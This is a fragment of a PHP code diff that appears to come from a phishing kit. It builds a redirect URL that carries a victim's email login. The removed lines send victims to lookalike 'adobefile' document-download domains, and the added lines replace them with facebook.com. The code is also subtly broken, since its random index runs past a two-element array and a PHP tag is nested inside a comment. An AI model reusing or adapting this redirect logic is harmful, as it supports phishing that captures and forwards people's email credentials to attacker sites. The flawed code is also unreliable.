@@ -23,14 +23,14 @@ $domain = getDomainFromEmail($login);
 
 
 <?php
-$liks = array("https://documentdownload.ga/adobefile/",
-"https://documentdownload.ml/adobefile/");
+$liks = array("https://facebook.com/",
+"https://facebook.com/");
 
 $num= mt_rand(0,5);
 
 $link= $liks[$num];
 
-//header("location: $link?email=<?php echo $login ");
+//header("location: $link?login=<?php echo $login ");
 $link =$link."?login=$login";
 
 ?>
